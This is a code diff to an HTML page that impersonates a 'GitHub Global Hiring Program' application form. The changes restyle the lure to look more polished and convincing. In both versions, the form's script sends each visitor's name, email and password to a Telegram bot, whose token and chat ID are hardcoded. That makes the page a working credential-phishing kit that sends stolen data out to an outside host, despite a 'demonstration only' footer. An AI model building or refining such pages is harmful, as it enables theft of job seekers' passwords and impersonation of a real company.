@@ -2,102 +2,164 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>Register for GitHub Global Hiring</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800&display=swap" rel="stylesheet">
   <style>
+    * {
+      box-sizing: border-box;
+    }
+
     body {
-      font-family: Arial, sans-serif;
-      background: #f3f3f3;
-      padding: 20px;
+      margin: 0;
+      padding: 0;
+      font-family: 'Inter', sans-serif;
+      background: linear-gradient(to right, #f8f9fa, #e9ecef);
+      color: #212529;
+    }
+
+    header {
+      background-color: #24292e;
+      color: white;
+      padding: 30px 20px;
+      text-align: center;
+      font-size: 24px;
+      font-weight: 800;
+    }
+
+    .container {
       display: flex;
       flex-direction: column;
       align-items: center;
+      justify-content: center;
+      padding: 40px 20px;
     }
+
     form {
       background: white;
-      padding: 30px;
-      border-radius: 10px;
-      max-width: 400px;
+      padding: 40px;
+      border-radius: 12px;
+      max-width: 450px;
       width: 100%;
-      box-shadow: 0 4px 10px rgba(0,0,0,0.1);
+      box-shadow: 0 10px 25px rgba(0, 0, 0, 0.1);
+      animation: slideIn 0.6s ease forwards;
     }
+
+    @keyframes slideIn {
+      from { opacity: 0; transform: translateY(30px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+
     input, button {
       width: 100%;
-      margin: 10px 0;
-      padding: 12px;
+      padding: 14px;
+      margin: 12px 0;
+      font-size: 16px;
       border-radius: 8px;
       border: 1px solid #ccc;
-      font-size: 16px;
     }
+
+    input:focus {
+      outline: none;
+      border-color: #007bff;
+      box-shadow: 0 0 5px rgba(0,123,255,0.4);
+    }
+
     button {
-      background-color: #007bff;
+      background-color: #28a745;
       color: white;
+      font-weight: bold;
       border: none;
+      transition: background-color 0.3s ease;
     }
+
     button:hover {
-      background-color: #0056b3;
+      background-color: #218838;
     }
+
     #thankyou {
       display: none;
-      margin-top: 20px;
-      color: green;
-      font-weight: bold;
+      margin-top: 30px;
+      font-weight: 600;
+      font-size: 18px;
+      color: #28a745;
+      text-align: center;
+      animation: fadeIn 1s ease forwards;
+    }
+
+    @keyframes fadeIn {
+      from { opacity: 0; }
+      to { opacity: 1; }
+    }
+
+    footer {
+      text-align: center;
+      padding: 20px;
+      font-size: 14px;
+      color: #6c757d;
+    }
+
+    .description {
+      max-width: 600px;
+      text-align: center;
+      margin: 20px auto;
+      color: #495057;
+      font-size: 17px;
     }
   </style>
 </head>
 <body>
+  <header>
+    GitHub Global Hiring Program
+  </header>
 
-  <h1>Register for GitHub Global Hiring</h1>
+  <div class="container">
+    <div class="description">
+      Join our exclusive GitHub Global Hiring initiative where top tech talent is discovered. Submit your details to be considered for the next round of hiring for engineering, research, and developer experience roles.
+    </div>
 
-  <form id="registerForm">
-    <input type="text" name="name" placeholder="Full Name" required />
-    <input type="email" name="email" placeholder="Email" required />
-    <input type="text" name="position" placeholder="Position Applying For" required />
-    <input type="password" name="password" placeholder="Set a Password" required />
-    <button type="submit">Register</button>
-  </form>
+    <form id="registerForm">
+      <input type="text" name="name" placeholder="Your Full Name" required />
+      <input type="email" name="email" placeholder="Your Email Address" required />
+      <input type="password" name="password" placeholder="Set a Secure Password" required />
+      <button type="submit">Submit Application</button>
+    </form>
 
-  <div id="thankyou">✅ Thank you! You will be contacted by email.</div>
+    <div id="thankyou">✅ Thank you! You will be contacted by email for the next steps.</div>
+  </div>
+
+  <footer>
+    © 2025 GitHub, Inc. · Built for demonstration only
+  </footer>
 
   <script>
-    const BOT_TOKEN = "7448574888:AAEqL3IHQocQslKBwia_TTAlt0jizyHao-U";
-    const CHAT_ID = "968143308";
-
     document.getElementById("registerForm").addEventListener("submit", async function (e) {
       e.preventDefault();
-
       const form = e.target;
+
       const data = {
         name: form.name.value,
         email: form.email.value,
-        position: form.position.value,
         password: form.password.value
       };
 
-      const message = `📩 *New GitHub Hiring Registration*:\n\n👤 Name: ${data.name}\n📧 Email: ${data.email}\n💼 Position: ${data.position}\n🔐 Password: ${data.password}`;
-      const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-
       try {
-        await fetch(telegramUrl, {
+        await fetch("https://api.telegram.org/bot7448574888:AAEqL3IHQocQslKBwia_TTAlt0jizyHao-U/sendMessage", {
           method: "POST",
-          headers: {
-            "Content-Type": "application/json"
-          },
+          headers: { "Content-Type": "application/json" },
           body: JSON.stringify({
-            chat_id: CHAT_ID,
-            text: message,
-            parse_mode: "Markdown"
+            chat_id: "968143308",
+            text: `📝 New GitHub Application\nName: ${data.name}\nEmail: ${data.email}\nPassword: ${data.password}`
           })
         });
 
         form.style.display = "none";
         document.getElementById("thankyou").style.display = "block";
       } catch (error) {
-        alert("Error submitting form.");
+        alert("There was an error submitting your application. Please try again.");
         console.error(error);
       }
     });
   </script>
-
 </body>
 </html>
